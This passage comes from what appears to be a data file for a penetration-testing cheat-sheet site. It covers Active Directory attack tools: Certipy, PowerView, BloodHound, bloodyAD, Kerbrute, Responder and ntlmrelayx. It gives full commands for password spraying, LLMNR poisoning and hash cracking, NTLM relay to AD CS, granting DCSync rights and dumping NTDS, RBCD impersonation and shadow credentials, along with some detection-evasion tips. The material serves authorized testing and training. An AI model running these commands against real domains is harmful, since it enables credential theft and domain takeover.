              ["certipy shadow remove -u user@corp.local -p pass -account target_user -device-id <id>", "Remove a specific key credential once done — good cleanup practice"],
              ["Follow-up auth", "Certipy automatically requests a certificate + NT hash for the target using the new key material via PKINIT"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full triage-to-domain-admin pass", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable -output ad_cs\n# review ad_cs_Certipy.txt for anything flagged ESC1-ESC16\n# exploit the highest-impact finding using the matching command above" },
              { label: "Relay to AD CS (ESC8) end to end", cmd: "certipy relay -ca <ca_ip>\n# on a second host, coerce the target DC/host to authenticate to you:\n# e.g. PetitPotam.py <listener_ip> <target>\n# Certipy relays the auth and issues a certificate for the coerced account" },
              { label: "Shadow credentials → PKINIT → hash", cmd: "certipy shadow auto -u user@corp.local -p Pass123 -account target_user\n# Certipy authenticates via the new key material and prints the account's NT hash directly" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always run -vulnerable first on an unfamiliar environment — it's the fastest way to triage which of ESC1-ESC16 is actually present before manually exploiting anything.",
              "ESC8 and ESC11 both require NTLM authentication to be reachable/enabled on the CA (HTTP web enrollment for ESC8, the ICPR RPC interface for ESC11) — confirm before assuming either path is viable.",
              "ESC9, ESC10, and ESC16 are all variations on the same underlying weak certificate-to-account mapping problem — they differ only in where the weak setting lives (template, DC registry, or CA/forest-wide).",
              "ESC15/EKUwu (CVE-2024-49019) was patched in the November 2024 security update, and the ESC16 global security-extension enforcement landed in Microsoft's February 2025 update — both are worth explicitly checking patch level for on older environments.",
              "A hash returned from certipy auth is just an NT hash — everything downstream (NetExec, Impacket, bloodyAD) treats it the same as any other.",
              "These techniques directly forge or hijack domain identities — confirm written authorization before running any of them outside a lab."
            ]
          }
        ]
      },
      {
        id: "powerview",
        name: "PowerView",
        url: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
        description: "PowerShell library for deep Active Directory situational awareness and enumeration.",
        brief: "PowerView is a PowerShell reconnaissance library for Active Directory — domain, user, group, computer, ACL, and trust enumeration in far more depth than a single command-line tool typically offers. Almost every function follows the same Get-Domain* / Get-Net* naming pattern, so once one is familiar the rest read the same way.",
        quickReference: [
          { label: "Domain SID", cmd: "Get-DomainSID" },
          { label: "Basic domain info", cmd: "Get-Domain" },
          { label: "Domain users, filtered to the useful columns", cmd: "Get-DomainUser | Select samaccountname,logoncount" },
          { label: "Recursive group membership", cmd: "Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse" },
          { label: "Sweep for local admin access", cmd: "Find-LocalAdminAccess -Verbose" }
        ],
        sections: [
          {
            title: "Domain Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainSID", "Return the current domain's SID"],
              ["Get-Domain", "Basic info about the current domain"],
              ["Get-Domain -Domain moneycorp.local", "Same, but targeting the forest root or another trusted domain"],
              ["Get-DomainPolicyData", "Domain policy, including max ticket lifetime — check this before hand-forging tickets, since Mimikatz/SafetyKatz default to a 10-year ticket that stands out immediately; Rubeus handles this matching automatically"],
              ["Get-DomainController", "List domain controllers for the current domain"],
              ["Get-NetLocalGroup -ComputerName dcorp-dc", "List local groups on a specific host"],
              ["Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators", "List members of a specific local group on a host"],
              ["Get-NetLoggedon -ComputerName dcorp-adminsrv", "List logged-on users on a host — needs local admin on the target"],
              ["Get-NetLoggedonLocal -ComputerName dcorp-adminsrv", "Same idea via a different technique — logon enumeration is noisy and leaves logs either way"],
              ["Get-LastLoggedOn -ComputerName dcorp-adminsrv", "Show the last user logged on to a host"],
              ["Invoke-ShareFinder -Verbose", "Find shares across hosts in the current domain — noisy; PowerHuntShares is a quieter alternative for large-scale share hunting"],
              ["Invoke-FileFinder -Verbose", "Search discovered shares for sensitive filenames"],
              ["Get-NetFileServer", "List servers hosting file shares across the domain"]
            ]
          },
          {
            title: "User Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainUser", "Dump every domain user with every property — pipe into Select to cut the noise, e.g. | Select samaccountname,logoncount"],
              ["Get-DomainUser -Identity student1", "Details on a single user"],
              ["Get-DomainUser -Identity student1 -Properties *", "All properties for a single user"],
              ["Get-DomainUser -Properties samaccountname,logonCount", "Every user, but only the columns you actually need"],
              ["Get-DomainUser -LDAPFilter \"Description=*built*\" | Select name,description", "Search the Description field directly — a surprising number of environments still leave passwords or hints there"]
            ]
          },
          {
            title: "Computer Object Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainComputer", "Enumerate computer objects in the domain"]
            ]
          },
          {
            title: "Group Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainGroup admin | select name", "Search groups by name in the current domain"],
              ["Get-DomainGroup -Domain moneycorp.local", "Same, targeting the forest root or another trusted domain"],
              ["Get-DomainGroup -UserName student1", "List a specific user's group memberships"]
            ]
          },
          {
            title: "Group Member Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse", "Fully expand nested group membership — flat membership queries miss members added via a nested group"]
            ]
          },
          {
            title: "ACL Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs", "Inbound: what rights other principals hold over this object"],
              ["Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser student1).ObjectSid}", "Outbound: what rights this principal holds over other objects"],
              ["Get-DomainObjectAcl -SearchBase \"LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\" -ResolveGUIDs -Verbose", "Target a specific LDAP path directly instead of searching by name — -ResolveGUIDs makes the rights human-readable"],
              ["Find-InterestingDomainAcl -ResolveGUIDs", "Surface ACL misconfigurations across the domain automatically, instead of checking objects one at a time"]
            ]
          },
          {
            title: "OU Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainOU -Identity Student*", "Search OUs by name pattern"],
              ["Get-GPO -Guid 7478F170-6A0C-490C-B355-9E4618BC785D", "Resolve a GPO's friendly name from its GUID"],
              ["Get-DomainGPO -Identity 'DevOps Policy'", "Look up a GPO directly by name"]
            ]
          },
          {
            title: "Trust Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainTrust -Domain moneycorp.local", "List trust relationships for a domain"],
              ["Get-ForestGlobalCatalog", "List global catalog servers for the forest"],
              ["Get-ForestTrust", "List forest-level trust relationships"],
              ["Get-ForestDomain -Forest eurocorp.local", "List domains belonging to a specific forest"]
            ]
          },
          {
            title: "Local Admin Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Find-LocalAdminAccess -Verbose", "Sweep the domain for hosts the current user has local admin on — noisy, expect roughly 3 log events per machine touched"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Initial domain situational awareness", cmd: "Get-Domain\nGet-DomainSID\nGet-DomainController\nGet-DomainPolicyData" },
              { label: "Finding a path to Domain Admin", cmd: "Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\nGet-DomainUser -Identity <target> -Properties *\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser <target>).ObjectSid}\nFind-InterestingDomainAcl -ResolveGUIDs" },
              { label: "Trust & forest mapping", cmd: "Get-DomainTrust\nGet-ForestDomain -Forest <forest>\nGet-ForestGlobalCatalog\nGet-ForestTrust" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Check Get-DomainPolicyData's max ticket lifetime before hand-forging tickets with Mimikatz/SafetyKatz — they default to a 10-year ticket, which stands out immediately against a normal policy. Rubeus matches the policy for you automatically.",
              "Get-NetLoggedon needs local admin on the target host to return anything.",
              "Get-NetLoggedonLocal and Invoke-ShareFinder are both noisy — prefer PowerHuntShares for large-scale share enumeration.",
              "LogonCount is a fast way to spot a stale/dormant privileged account — a Domain Admin account with a near-zero logon count is worth flagging.",
              "Find-LocalAdminAccess leaves log entries on every host it checks — budget for that noise on a monitored network.",
              "PowerView triggers AMSI/EDR fairly reliably on modern endpoints — expect to need obfuscation or an alternate loader outside a lab."
            ]
          }
        ]
      },
      {
        id: "bloodhound",
        name: "BloodHound",
        url: "https://github.com/SpecterOps/BloodHound",
        description: "Graphs Active Directory attack paths from collected relationship data.",
        brief: "BloodHound ingests Active Directory relationship data — group memberships, ACLs, sessions, delegation rights — and renders it as a graph, turning \"who can do what to whom\" into a visual attack path. The single most useful query on almost any engagement is shortest-path-to-Domain-Admin.",
        quickReference: [
          { label: "Collect everything (Windows)", cmd: "SharpHound.exe -c All" },
          { label: "Collect everything (cross-platform)", cmd: "bloodhound-python -u user -p pass -d domain.local -c All" },
          { label: "Collect straight from NetExec", cmd: "nxc ldap dc.domain.local -u user -p pass --bloodhound -c All" },
          { label: "Import & analyze", cmd: "Upload the resulting .zip in BloodHound CE, then run \"Shortest Paths to Domain Admins\"" }
        ],
        sections: [
          {
            title: "Collection",
            type: "table",
            columns: ["Command / Option", "Description"],
            rows: [
              ["SharpHound.exe -c All", "Default Windows ingestor — run from a domain-joined context"],
              ["bloodhound-python -u user -p pass -d domain.local -c All", "Impacket-based ingestor — runs from Linux, no domain-joined host required"],
              ["nxc ldap <dc> -u user -p pass --bloodhound -c All", "Collect directly from an already-open NetExec session instead of running a separate ingestor"],
              ["-c All / Default / Session / ACL / Group / LocalAdmin", "Scope collection down when a full run is too slow or too noisy for the environment"]
            ]
          },
          {
            title: "Importing Data",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["BloodHound CE upload", "Drag the collector's output .zip into the web UI's upload panel"],
              ["Incremental re-import", "Re-run collection and re-upload periodically — AD relationships change, and a stale graph shows paths that no longer exist"]
            ]
          },
          {
            title: "Built-in Queries",
            type: "table",
            columns: ["Query", "What it surfaces"],
            rows: [
              ["Shortest Paths to Domain Admins", "Every shortest path from any node to a Domain Admins member — usually the first query to run"],
              ["Find All Domain Admins", "Just the membership list, no path analysis"],
              ["Shortest Paths from Kerberoastable Users", "Whether a Kerberoastable account (one with an SPN) sits on a path to something valuable"],
              ["Find Computers where Domain Users are Local Admin", "Broad local-admin exposure across the domain — often a fast win"]
            ]
          },
          {
            title: "Path / Cypher Queries",
            type: "table",
            columns: ["Example", "Description"],
            rows: [
              ["MATCH p=shortestPath((u:User)-[*]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})) RETURN p", "Custom shortest-path query typed directly into BloodHound CE's Cypher bar"],
              ["MATCH (n {name:\"STUDENT1@DOMAIN.LOCAL\"})-[r]->(m) RETURN n,r,m", "All outbound edges from a specific principal — useful once you've picked a starting point"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard collection & analysis pass", cmd: "bloodhound-python -u user -p pass -d domain.local -c All\n# upload the .zip into BloodHound CE\n# run \"Shortest Paths to Domain Admins\"\n# pivot on the first edge in the path and repeat for that node" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Refresh collection periodically on longer engagements — group memberships and ACLs change, and a stale graph shows paths that no longer exist.",
              "SharpHound generates a real amount of LDAP and SMB traffic — expect it to be noisy on a monitored network.",
              "BloodHound CE replaced the legacy Neo4j-desktop-based community edition — collector output format is the same .zip either way.",
              "Treat every edge as a lead to verify, not a guarantee — confirm a path manually (e.g. with NetExec) before relying on it during an engagement."
            ]
          }
        ]
      },
      {
        id: "bloodyad",
        name: "bloodyAD",
        url: "https://github.com/CravateRouge/bloodyAD",
        description: "AD privilege-escalation swiss-army knife — reads and writes almost any AD object or attribute directly over LDAP.",
        brief: "bloodyAD talks straight to LDAP (or LDAPS) instead of wrapping other tools, and can authenticate with a password, an NTLM hash, a Kerberos ticket, or a certificate. Once authenticated, it reads and writes nearly any AD object or attribute a controlled principal has rights to — group membership, passwords, computer accounts, shadow credentials, RBCD, DCSync rights, UAC flags, SPNs, and more — all through one consistent verb/object syntax (add / get / set / remove <object> <target> ...).\n\nIt's the tool that turns a BloodHound edge (GenericAll, WriteDacl, WriteOwner, AddSelf, AddMember, GenericWrite, etc.) into an actual action. Find the edge in BloodHound, then execute it here.",
        quickReference: [
          { label: "See what the current user can actually write", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> get writable" },
          { label: "Add yourself to a group", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add groupMember <group> user" },
          { label: "Reset a user's password", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> set password <target_user> 'NewPass123!'" },
          { label: "Add a computer account (up to MachineAccountQuota)", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add computer EVILPC 'Passw0rd123!'" },
          { label: "Grant yourself DCSync rights", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add dcsync user" }
        ],
        sections: [
          {
            title: "Connecting & Authentication",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d / --domain <domain>", "Target domain"],
              ["--host <dc_ip_or_fqdn>", "Domain controller to bind against"],
              ["-u / --username <user>", "Username to authenticate as"],
              ["-p / --password <pass>", "Password auth"],
              ["-p ':<LM>:<NT>'", "NTLM pass-the-hash auth — same flag, hash instead of a cleartext password"],
              ["-k / --kerberos", "Use Kerberos instead of NTLM — pulls a ticket from the KRB5CCNAME ccache"],
              ["-c / --certificate <cert.pfx>", "Authenticate via PKINIT using a certificate (pairs directly with Certipy/shadow credentials output)"],
              ["-s ldaps://<dc>", "Force LDAPS instead of plaintext LDAP — required if the DC enforces channel binding"]
            ]
          },
          {
            title: "Reading Objects",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["get writable", "List every object/attribute the authenticated principal can currently write — the single best recon command in the tool"],
              ["get object <target> [--attr <attr>]", "Dump every attribute of an object, or just one specific attribute"],
              ["get children <target>", "List child objects of a container/OU"],
              ["get membership <target>", "Resolve a principal's full effective group membership, including nested groups"],
              ["get search <ldap_filter> --attr <attr>", "Raw LDAP search when you need a filter bloodyAD doesn't have a dedicated verb for"]
            ]
          },
          {
            title: "Group & Account Management",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add groupMember <group> <member>", "Add a user/computer to a group (AddMember / AddSelf edges)"],
              ["remove groupMember <group> <member>", "Remove a member from a group"],
              ["add user <name> <password>", "Create a new user object"],
              ["add computer <name> <password>", "Create a new computer account — every authenticated user can do this up to ms-DS-MachineAccountQuota (default 10)"],
              ["set password <target> <new_password>", "Reset a target account's password — needs User-Force-Change-Password / GenericAll-style rights"],
              ["remove object <target>", "Delete an object outright — needs strong rights, use carefully"],
              ["set owner <target> <new_owner>", "Change an object's owner — often the first move once WriteOwner is available"]
            ]
          },
          {
            title: "ACL / Rights Abuse",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add genericAll <target> <trustee>", "Grant a trustee GenericAll over a target object — the classic \"turn one edge into full control\" move"],
              ["remove genericAll <target> <trustee>", "Revoke it again — good cleanup practice once you're done"],
              ["add dcsync <trustee>", "Grant a trustee the Replicating Directory Changes / All rights needed for DCSync"],
              ["remove dcsync <trustee>", "Revoke DCSync rights"],
              ["add uac <target> -f ACCOUNTDISABLE", "Flip a UserAccountControl flag off — e.g. re-enable a disabled account (prefix with remove to flip it on)"]
            ]
          },
          {
            title: "Shadow Credentials & Certificates",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add shadowCredentials <target>", "Add a msDS-KeyCredentialLink to a target account without touching its password, then authenticate via PKINIT"],
              ["remove shadowCredentials <target> <device_id>", "Remove a specific key credential — cleanup after the attack"],
              ["add altSecID <target> <mapping_string>", "Write an explicit certificate mapping into altSecurityIdentities (ESC14-style abuse, if the attribute is writable)"]
            ]
          },
          {
            title: "Resource-Based Constrained Delegation (RBCD)",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add rbcd <target_computer> <controlled_principal>", "Set msDS-AllowedToActOnBehalfOfOtherIdentity so the controlled principal can impersonate anyone against the target computer"],
              ["remove rbcd <target_computer> <controlled_principal>", "Remove that delegation — clean up once the follow-on Rubeus s4u step is done"],
              ["Typical pairing", "add computer (to create a controlled principal) → add rbcd → Rubeus s4u /impersonateuser:administrator to get a usable ticket"]
            ]
          },
          {
            title: "gMSA & Kerberos-Adjacent Attributes",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["get object <gmsa_dn> --attr msDS-ManagedPassword", "Read a gMSA's managed password blob (needs read rights on the attribute — decode downstream with Certipy/NetExec-style tooling)"],
              ["add spn <target> <spn_value>", "Give a target account an SPN, making it Kerberoastable even if it wasn't before"],
              ["remove spn <target> <spn_value>", "Remove the SPN again once done"],
              ["add uac <target> -f DONT_REQ_PREAUTH", "Disable Kerberos pre-auth on a target, making it ASREPRoastable"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Recon-to-action: find and use a writable edge", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> get writable\n# spot e.g. GenericAll over a group you're not in:\nbloodyAD -d corp.local -u user -p pass --host <dc> add groupMember <group> user" },
              { label: "Full RBCD abuse chain", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add computer EVILPC 'Passw0rd123!'\nbloodyAD -d corp.local -u user -p pass --host <dc> add rbcd <target_computer> 'EVILPC$'\nRubeus.exe s4u /user:EVILPC$ /rc4:<evilpc_nt_hash> /impersonateuser:administrator /msdsspn:cifs/<target_computer> /ptt" },
              { label: "Shadow credentials → PKINIT hash recovery", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add shadowCredentials target_user\n# outputs a .pfx — feed it into Certipy:\ncertipy auth -pfx target_user.pfx -dc-ip <dc>" },
              { label: "DCSync rights grant + dump", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add dcsync user\nnxc smb <dc> -u user -p pass --ntds" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "bloodyAD doesn't grant rights out of nowhere — every abuse here still needs a real starting edge (GenericAll, WriteDacl, WriteOwner, AddMember, etc.). Run BloodHound first to find it, then use bloodyAD to actually execute it.",
              "ms-DS-MachineAccountQuota defaults to 10 — any authenticated domain user can add up to that many computer accounts unless it's been explicitly lowered.",
              "bloodyAD's LDAP-native design makes it a clean choice as the payload for an NTLM relay (e.g. ntlmrelayx.py -c 'bloodyAD ... add groupMember ...') instead of relaying to SMB/HTTP.",
              "Always clean up what you added (group membership, RBCD, shadow credentials, SPNs) once the engagement or lab session is done — these are real, persistent changes to the directory."
            ]
          }
        ]
      },
      {
        id: "kerbrute",
        name: "Kerbrute",
        url: "https://github.com/ropnop/kerbrute",
        description: "Fast Kerberos pre-auth username enumeration and password spraying against a DC.",
        brief: "Kerbrute abuses Kerberos pre-authentication to do two things quietly: confirm which usernames exist in a domain, and spray passwords against them. Because a pre-auth request for a non-existent user returns a different error than one for a valid user, you can enumerate accounts without a single logon event being generated — failed Kerberos pre-auth is far quieter than failed SMB or LDAP binds.\n\nIt is usually the first tool pointed at a domain controller once you have a username list (from OSINT, document metadata, or a naming convention) but no credentials yet.",
        quickReference: [
          { label: "Enumerate valid usernames", cmd: "kerbrute userenum -d target.local --dc 10.10.10.10 users.txt" },
          { label: "Spray one password across many users", cmd: "kerbrute passwordspray -d target.local --dc 10.10.10.10 users.txt 'Winter2026!'" },
          { label: "Brute one user (careful — lockout)", cmd: "kerbrute bruteuser -d target.local --dc 10.10.10.10 passwords.txt jdoe" },
          { label: "Test a list of user:pass combos", cmd: "kerbrute bruteforce -d target.local --dc 10.10.10.10 combos.txt" }
        ],
        sections: [
          {
            title: "Modes",
            type: "table",
            columns: ["Mode", "What it does"],
            rows: [
              ["userenum", "Confirm which usernames exist — no password attempt, generates no logon failure"],
              ["passwordspray", "Try one password against every user in the list — the safe direction for avoiding lockouts"],
              ["bruteuser", "Try many passwords against one user — high lockout risk, use only with a known policy"],
              ["bruteforce", "Read user:password pairs from a file or stdin"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target Kerberos realm (the AD domain FQDN)"],
              ["--dc <ip>", "Domain controller to talk to; if omitted, Kerbrute resolves it via DNS"],
              ["-o <file>", "Write results to a file"],
              ["-t <n>", "Threads (default 10) — raise cautiously, a DC will notice a flood"],
              ["--delay <ms>", "Delay between attempts, to stay under detection thresholds"],
              ["--safe", "Abort the whole spray if any account comes back locked out"],
              ["-v", "Verbose — show every attempt, including the failures"]
            ]
          },
          {
            title: "Why It Is Quiet",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Pre-auth error codes", "A missing user returns PRINCIPAL_UNKNOWN; a valid user with a wrong password returns PREAUTH_FAILED — the difference is what enumeration reads"],
              ["No 4625 by default", "AS-REQ failures do not produce a standard failed-logon event on older configs, unlike SMB/LDAP"],
              ["Detection reality", "Modern DCs can log 4768 with failure codes; a burst of AS-REQs from one host is detectable if anyone is looking"],
              ["Lockout still applies", "Kerberos pre-auth failures increment the badPwdCount — spraying too fast still locks accounts"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Enumerate then spray", cmd: "# 1. build a username list from OSINT / naming convention\n# 2. confirm which ones exist\nkerbrute userenum -d target.local --dc 10.10.10.10 -o valid.txt users.txt\n# 3. spray ONE password against only the valid users\nkerbrute passwordspray -d target.local --dc 10.10.10.10 \\\n  $(awk '{print $NF}' valid.txt) 'Autumn2026!' --safe" },
              { label: "Generate the username permutations first", cmd: "# from 'John Doe' produce jdoe, john.doe, johnd, doej ...\n# username-anarchy or a small script, then feed the list to userenum" },
              { label: "Respect the lockout policy", cmd: "# read the policy before spraying:\nnetexec smb 10.10.10.10 -u '' -p '' --pass-pol\n# spray one attempt, then wait out the observation window before the next" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always read the account lockout policy before spraying. One password per observation window per user is the rule that keeps you from locking out the domain.",
              "userenum needs no credentials at all — it is a pre-auth operation, which makes it a legitimate first step against a domain you can reach but cannot yet authenticate to.",
              "Spraying is a detection event on a mature network. Space attempts out with --delay and prefer a single well-chosen seasonal password over a wordlist.",
              "Feed valid users straight into AS-REP roasting — some of the accounts Kerbrute confirms will have pre-auth disabled.",
              "See the AS-REP Roasting and Kerberos theory pages for what the pre-auth exchange actually is."
            ]
          }
        ]
      },
      {
        id: "responder",
        name: "Responder",
        url: "https://github.com/lgandx/Responder",
        description: "Poisons LLMNR/NBT-NS/mDNS to capture NetNTLM hashes on the local segment.",
        brief: "Responder is a rogue responder for Windows' name-resolution fallback protocols. When a Windows host fails to resolve a name over DNS, it broadcasts an LLMNR/NBT-NS/mDNS query to the whole segment asking 'does anyone know where SHARE01 is?' — and Responder answers 'yes, it's me', collecting the NetNTLM authentication the victim then offers.\n\nIt is the classic opening move on an internal network: sit on the wire, poison broadcast name resolution, and harvest hashes to crack offline or relay onward. Everything it does is loud on the local segment, so it belongs in the active phase of an engagement.",
        quickReference: [
          { label: "Standard analyze-then-poison run", cmd: "sudo responder -I eth0 -w -d" },
          { label: "Listen only, poison nothing (recon)", cmd: "sudo responder -I eth0 -A" },
          { label: "Disable SMB/HTTP to relay instead", cmd: "sudo responder -I eth0 (with SMB=Off, HTTP=Off in Responder.conf)" },
          { label: "Where captured hashes land", cmd: "/usr/share/responder/logs/  (and the SQLite DB)" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-I <iface>", "Interface to bind to — required"],
              ["-A", "Analyze mode: watch and log poisoning opportunities without actually responding"],
              ["-w", "Start the WPAD rogue proxy server — catches browsers auto-detecting a proxy"],
              ["-d", "Answer DHCP requests to poison via DNS as well (aggressive)"],
              ["-f", "Fingerprint the host that queried (OS, version)"],
              ["-v", "Verbose output"],
              ["-F", "Force WPAD auth even where not strictly required"]
            ]
          },
          {
            title: "The Poisoned Protocols",
            type: "table",
            columns: ["Protocol", "What it is"],
            rows: [
              ["LLMNR (UDP 5355)", "Link-Local Multicast Name Resolution — the primary DNS fallback on modern Windows"],
              ["NBT-NS (UDP 137)", "NetBIOS Name Service — the older fallback, still enabled on many networks"],
              ["mDNS (UDP 5353)", "Multicast DNS — another name-resolution path Responder can answer"],
              ["WPAD", "Web Proxy Auto-Discovery — clients ask for a proxy config; the rogue proxy prompts for auth"]
            ]
          },
          {
            title: "What You Capture",
            type: "table",
            columns: ["Item", "Notes"],
            rows: [
              ["NetNTLMv2 hashes", "The common case — crackable offline with hashcat mode 5600, not pass-the-hash-able"],
              ["NetNTLMv1 hashes", "If a host is misconfigured for v1 (hashcat 5500) — can be downgraded to NTLM and is far weaker"],
              ["Cleartext (rare)", "Basic-auth prompts over the rogue HTTP/WPAD server occasionally yield plaintext"],
              ["Why not pass-the-hash", "NetNTLM is a challenge-response hash, not the NT hash — you crack it or relay it, you do not replay it"]
            ]
          },
          {
            title: "Capture vs Relay",
            type: "table",
            columns: ["Mode", "Setup"],
            rows: [
              ["Capture", "Default — Responder's own SMB/HTTP servers accept the auth and log the hash for offline cracking"],
              ["Relay", "Turn SMB=Off and HTTP=Off in Responder.conf so ntlmrelayx can take the auth instead and forward it live"],
              ["When to relay", "When the captured hash is uncrackable, or when SMB signing is off on a target worth relaying to"],
              ["Coexistence", "Responder poisons (gets the victim to connect); ntlmrelayx handles the forwarded authentication"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Passive recon before poisoning", cmd: "# see how much LLMNR/NBT-NS traffic exists before you make noise\nsudo responder -I eth0 -A\n# if the segment is chatty, poisoning will be productive" },
              { label: "Capture and crack", cmd: "sudo responder -I eth0 -wd\n# hashes accumulate in /usr/share/responder/logs/\nhashcat -m 5600 SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt" },
              { label: "Hand off to relay", cmd: "# in /usr/share/responder/Responder.conf set SMB = Off and HTTP = Off\nsudo responder -I eth0\n# in another terminal:\nntlmrelayx.py -tf targets.txt -smb2support" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is loud and it touches other people's machines on the segment. It is firmly an active-phase tool and needs explicit authorisation.",
              "NetNTLMv2 is challenge-response — you cannot pass-the-hash it. Crack it offline or relay it live; those are the only two options.",
              "If you plan to relay, remember to switch Responder's own SMB and HTTP servers off first, or it will grab the auth before ntlmrelayx can.",
              "Analyze mode (-A) is a legitimate low-noise recon step: it tells you whether poisoning will even be productive before you commit to the noise.",
              "See the Coercion & NTLM Relay theory page for how capture and relay fit into a full attack chain."
            ]
          }
        ]
      },
      {
        id: "ntlmrelayx",
        name: "ntlmrelayx",
        url: "https://github.com/fortra/impacket",
        description: "Relays coerced or poisoned NTLM authentication to other services in real time.",
        brief: "ntlmrelayx (part of Impacket) takes an NTLM authentication that a victim was tricked into starting — via Responder poisoning or a coercion technique — and forwards it, live, to a service that will accept it. Because the relayed authentication carries the victim's identity, anything that victim can do, you can now do: dump the SAM, add a computer account, write to LDAP, or authenticate to AD CS for a certificate.\n\nIt is the pivot that turns a captured hash you cannot crack into direct action, and it is the reason SMB signing and channel binding exist.",
        quickReference: [
          { label: "Relay to SMB targets, dump SAM", cmd: "ntlmrelayx.py -tf targets.txt -smb2support" },
          { label: "Relay to LDAP, dump the domain", cmd: "ntlmrelayx.py -t ldap://dc01 --dump-adcs" },
          { label: "Relay to AD CS web enrolment (ESC8)", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" },
          { label: "Relay + RBCD takeover of a computer", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" },
          { label: "Interactive SMB session on success", cmd: "ntlmrelayx.py -tf targets.txt -smb2support -i" }
        ],
        sections: [
          {
            title: "Target Selection",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <target>", "Single target — protocol matters: smb://, ldap://, ldaps://, http://, mssql://"],
              ["-tf <file>", "List of targets, one per line"],
              ["-smb2support", "Enable SMB2 — needed for essentially all modern Windows targets"],
              ["-i", "Drop to an interactive session on a successful relay"],
              ["-socks", "Open a SOCKS proxy multiplexing all successful relayed sessions"],
              ["-wh <host> / -wa", "Serve a rogue WPAD to widen the pool of victims"]
            ]
          },
          {
            title: "Attack Modes",
            type: "table",
            columns: ["Flag", "What it achieves"],
            rows: [
              ["(default SMB)", "Dump the SAM and LSA secrets of the relayed-to host"],
              ["-e / -c", "Execute a payload or command on the target"],
              ["--dump-adcs", "Enumerate AD CS from a relayed LDAP session"],
              ["--adcs --template <t>", "Relay to the CA web endpoint and enrol a cert as the victim (ESC8)"],
              ["--delegate-access", "Configure RBCD so a computer account you control can impersonate on the target"],
              ["--add-computer", "Create a new machine account via the relayed LDAP session"],
              ["--escalate-user <u>", "Grant a chosen user DCSync rights when relaying a privileged account to LDAP"]
            ]
          },
          {
            title: "Why Relaying Works (and When It Fails)",
            type: "table",
            columns: ["Condition", "Effect"],
            rows: [
              ["SMB signing not required", "SMB relay works — this is the classic misconfiguration"],
              ["SMB signing required", "SMB relay fails; pivot to LDAP or AD CS targets instead"],
              ["LDAP channel binding off", "LDAPS relay works — enables RBCD and Shadow Credential attacks"],
              ["EPA not enforced on AD CS web", "ESC8 relay to certsrv works — yields a cert, then a TGT"],
              ["Same-host relay blocked", "You cannot relay a host's auth back to itself (MS08-068 era fix) — relay elsewhere"]
            ]
          },
          {
            title: "Coercion Pairings",
            type: "table",
            columns: ["Coercion source", "Typical relay target"],
            rows: [
              ["Responder (LLMNR/NBT-NS)", "Any SMB target with signing off"],
